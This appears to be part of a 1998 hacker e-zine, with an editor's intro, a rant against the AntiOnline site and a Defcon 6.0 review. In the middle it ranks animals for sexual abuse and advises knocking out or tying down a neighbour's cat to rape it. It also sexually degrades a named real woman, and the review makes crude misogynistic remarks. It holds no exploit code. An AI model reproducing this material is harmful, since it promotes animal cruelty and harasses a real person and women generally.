hi. i am your editor, ge0rge, here to protect and serve, and yes, b4b0 iz
good to the last drop. Bringing you probably the most el8 shit around,
b4b0 is here, possibly forever (or till one of us gets sober). We only
have one policy here, and thats 'its not our fucking fault you did
something because of this publication, dumb shits.' take this policy to
heart. aside from that, this zine ought to fucking own because we have
alcohol, porn, and a pack of condemz.. so i estimate, overall, this ought
to be an enjoyable experience for not only me, but you too (yes YOU!).
Anyways, have a nice day and remember, only you can prevent forest fires.

Media whores.


        Publicity is the name of the game. I just had to add
JP@antionline.com in this section because what he does is total bullshit.
He gives publicity to people who change html on sites, gives fame to those
who crack senstitive sites, but yet disapproves of the 'evil cracker.'
        JP, as you probably know, runs that loser script kiddie site known
as www.antionline.com. It is funny however, how he preaches on the matter
of computer security, yet knows nothing of the sort other than what he
seen off a movie (we won't say which, you figure it out). But, the most
contraversial thing is how on one side he talks about how stopping the
evil cracker, but yet on his site, he releases full source to "exploits"
which give any idiot with compilation knowledge the ability to gain
unauthorized access / unauthorized priveledges to a system. Sure sure,
i'll agree that security through obscurity is futile, but security through
distribution of full source code to every idiot on the planet sure isn't
security. Oh, but wait, exploits are what get the hits right?

To prove b4b0z point, here iz some docz.

   This Week's MailBag
   Wednesday 4:15am, July 22, 1998
   It's late, but it's here. Our weekly
   mailbag gives you the opportunity
   to ask questions, and make comments.
   See what other people are saying
   about current security issues.

It says "gives you the opportunity to ask questions, and make comments"
but yet all the mail b4b0 has sent in has not been in the 'mailbag.' But
then again, what doesn't approve of antionline.com doesn't go up now does
it? Censorship is bad he says, but yet he censors the mail.

funny isn't it.

#1 HORSE:
difficulty      : expert
risk            : tons
pleasure        : 10 on b4b0 scale.
background      : screwing horses, started off as an amish tradition. Seeing
                  how amish people have more strength than normal human beings
                  and that horses can't talk (cept for mister ed), the horse
                  was / is the best source of sin / pleasure for the amish
                  people. Due to the horse waking up and getting pissed off
                  because your penis is in its anus and kicking you in your
                  chest w/5000 pounds of force, this type of pleasure is for
                  experts ONLY. novices, stick to lower farm animals and
                  house hold pets.

pleasure        : -5
background      : one word, sick. if you are willing to give this nasty
                  shit a go, check into a hospital, cuz you got problemz.
                  Carol Meinals anus first discovered by explorers of the
                  spanish inquisition. The natives called it "aboobajama",
                  meaning "thing who sucks in all" but the spanish called it
                  "anos de diablo." Be afraid, be very afraid.

#3 Your Neighbors cat.
difficulty      : novice
pleasure        : 7 (depending on how much you hate/want cat)
background      : The cat has a lot of defenses against such rape attacks
                  i.e. claws, teath. It is highly recommended that the
                  cat is either knocked out or tied down securely. It is
                  a good tool for revenge, nothing scares the neighbors more
                  or pisses them off more than a cat with a humongous anus.

#4 New York Street Rats
difficulty      : novice
pleasure        : 5
background      : fierce, rabid, but very doable. Take caution because the rats
                  DO have claws and teeth, so like the cat, you must either
                  knock it out, or take the necessary precautions to do it
                  properly.

#5 Domestic Farm Pig. (also referred to as 'hog')
difficulty      : beginner
pleasure        : 6
background      : The south is where you'll primarily see alot of this type
                  of sexual molestation. A good ride for the beginner, easy
                  source of pleasure because the pig does not fight back
                  hardly at all. No real warnings. Truly, the other white
                  meat.


Welp, that ends it for now, stay tuned for the next article, on "Sexuality
In Farm Animals and Other Related Things." Until next time!

- -[7] Defcon 6.0 Review - tEEp]- -
b4b0!b4b0!b4b0!b4b0!b4b0!b4b0!b4b0!b4b0!b4b0!b4b0!b4b0!b4b0!b4b0!b4b0!b4b
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -

Over the course of five years, Defcon has become the largest, most
popular convention to go to. One chance to go and you'll see why;
not neccesarily the chance to see speakers or the chance to check out
product exhibitions; but the fact that it's a chance to meet up
with people, in of all places, Las Vegas.

105 degree weather, palm trees, and scantily clad women on taxi cab
ads were plainly in sight. Nudie "booklets" were available for free
in newspaper machines.

The Glitter Gulch stood prominently in the Freemont Experience.
It's a place that defines Las Vegas.

Women, alcohol, and gambling. Oh yeah, and Defcon.

Friday was registration ($40) and opening remarks by Dark Tangent.
Drinking and gambling in-between. A rather dull discussion on
lock picking by Gurney Halleck followed. DJs setup their equipment,
while the Capture the Flag network equipment fell into place.
What was an empty area suddenly became alive and busy.

No leet hackers were to been seen anywhere (guess they all came on
Saturday). All no-names and cluebies made the rounds everywhere. In
addition, everyone has resented the way hackers are dressed in the
movie, "Hackers." One look around, and you'll see it all over again.

Various desks popped up in the secondary room with people selling
Defcon/OpenBSD/cDc/etc clothing, CDs (FreeBSD/NetBSD/OpenBSD), used
hardware, books (amongst of which Carolyn "Clueless" Meinel's book
was seen), and even employment services.

The three girls selling the "Brute" DefCon T-shirt were very
babelicious. Go ahead and buy a T-shirt.

Hacker Jeopardy started; as people tested their knowledge, others
gambled and drank the night away... Hookers slept with a few haxx0rs
that night.

As Saturday came, the morning speeches were rather dull. The Hotel
Hacking discussion was rather interesting, however. Of course,
Ira had to go on his preachy rant about what takes "real technical
skills." Of course his speech was rather undetailed and not
very technical at all. Go figure.

The waitresses are hot at the Luxor Hotel. I highly recommend going there
to gamble. Talk about a high skirt with legs. Damn.

The Cult of the Dead Cow's intro/demo for Back Orifice was overpacked
and stuffy. Seems like every script kiddie needed a new tool to play
with. Wow, Windows can be cool again. Whutever. An interesting program;
however possibly overrated.

Of course as the afternoon waxed to night, people changed clothes to attend
the Black and White Ball. A guy wearing a towel, a guy in a bathrobe,
two guys in drag; what about the women? Since the male:female ratio was
practically 10:1, there's not much to talk about; other than the fact
there was a fat ass bitch who thought she was the shit, and the T-shirt
selling babes. Oh man, what a sight.

Sunday's theme was "missing in action." Many people left in the morning,
as well as Se7en not showing up for his speech. As people said their
goodbyes, everyone knew... next year, next year...
